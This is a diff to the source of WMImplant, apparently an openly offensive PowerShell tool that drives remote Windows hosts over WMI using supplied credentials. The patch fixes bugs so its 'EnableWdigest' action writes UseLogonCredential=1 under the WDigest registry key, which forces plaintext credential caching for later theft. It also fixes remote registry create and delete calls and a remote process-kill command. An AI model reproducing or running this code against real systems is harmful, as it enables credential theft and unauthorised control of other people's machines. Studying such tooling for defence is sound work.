@@ -989,11 +989,11 @@ function Invoke-CommandGeneration
         {
             if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
-                $Command = "`nInvoke-WMImplant -EnableWdigest -KeyCreate -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue '1' -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
+                $Command = "`nInvoke-WMImplant -EnableWdigest -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
             }
             else
             {
-                $Command = "`nInvoke-WMImplant -EnableWdigest -KeyCreate -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue '1' -Target $GenTarget`n"
+                $Command = "`nInvoke-WMImplant -EnableWdigest -Target $GenTarget`n"
             }
             $Command
         }
@@ -1017,7 +1017,7 @@ function Invoke-CommandGeneration
             $GenRegMethod = $GenRegMethod.Trim().ToLower()
             $GenRegHive = Read-Host "What hive would you like to modify, [hklm] or [hkcu]? >"
             $GenRegKey = Read-Host "What's the registry key you'd like to modify? Ex: SOFTWARE\Microsoft\Windows >"
-            $GenRegValue = Read-Host "What's the registry value you'd like to modify? Ex: WMImplantInstalled >"
+            $GenRegValue = Read-Host "What's the registry subkey you'd like to modify? Ex: WMImplantInstalled >"
 
             switch($GenRegMethod)
             {
@@ -1153,12 +1153,12 @@ function Invoke-CommandGeneration
                     $GenProcID = Read-Host "What's the Process ID of the process you want to kill? >"
                     if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                     {
-                        $Command = "`nInvoke-WMImplant -ProcessKill -ProcessID $GenProcID -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
+                        $Command = "`nInvoke-WMImplant -ProcessKill -ProcessID $GenProcID -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
                     }
 
                     else
                     {
-                        $Command = "`nInvoke-WMImplant -ProcessKill -ProcessID $GenProcID -Target $GenTarget -Target $GenTarget`n"
+                        $Command = "`nInvoke-WMImplant -ProcessKill -ProcessID $GenProcID -Target $GenTarget`n"
                     }
                 }
             }
@@ -1637,7 +1637,7 @@ function Invoke-RegValueMod
             $RegSubKey = Read-Host "What's the registry Sub Key you'd like to modify? Ex: WMImplantInstalled >"
         }
 
-        if ((!$KeyCreate) -or (!$KeyDelete))
+        if ((!$KeyCreate) -and (!$KeyDelete))
         {
             $question = Read-Host "Do you want to [create] or [delete] a key? >"
             $question = $question.Trim().ToLower()
@@ -2207,6 +2207,8 @@ function Invoke-WMImplant
         [switch]$LogOff,
         [Parameter(Mandatory = $False, ParameterSetName='Reboot System')]
         [switch]$Reboot,
+        [Parameter(Mandatory = $False, ParameterSetName='Remote PowerShell')]
+        [string]$Location,
         [Parameter(Mandatory = $False, ParameterSetName='Power Off System')]
         [switch]$PowerOff
     )
@@ -2458,12 +2460,12 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-RegValueMod -Creds $RemoteCredential -KeyCreate -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -Target $Computer
+                    Invoke-RegValueMod -Creds $RemoteCredential -KeyCreate -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue 1 -Target $Computer
                 }
 
                 else
                 {
-                    Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -Target $Computer
+                    Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue 1 -Target $Computer
                 }
             }
         }
@@ -2506,6 +2508,11 @@ function Invoke-WMImplant
                 Throw "You need to specify the registry key you will add or remove a value from!"
             }
 
+            if(!$RegSubKey)
+            {
+                Throw "You need to specify the registry sub key you will add or remove a value from!"
+            }
+
             if(!$RegValue)
             {
                 Throw "Please provide the registry value you are looking to modify!"
@@ -2515,11 +2522,11 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-RegValueMod -Target $Computer -Creds $RemoteCredential -KeyCreate -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegValue -RegValue $RegValue
+                    Invoke-RegValueMod -Target $Computer -Creds $RemoteCredential -KeyCreate -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey -RegValue $RegValue
                 }
                 else
                 {
-                    Invoke-RegValueMod -Target $Computer -KeyCreate -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegValue -RegValue $RegValue
+                    Invoke-RegValueMod -Target $Computer -KeyCreate -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey -RegValue $RegValue
                 }
             }
         }
@@ -2550,11 +2557,11 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-RegValueMod -Target $Computer -Creds $RemoteCredential -KeyDelete -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegValue
+                    Invoke-RegValueMod -Target $Computer -Creds $RemoteCredential -KeyDelete -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey
                 }
                 else
                 {
-                    Invoke-RegValueMod -Target $Computer -KeyDelete -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegValue
+                    Invoke-RegValueMod -Target $Computer -KeyDelete -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey
                 }
             }
         }
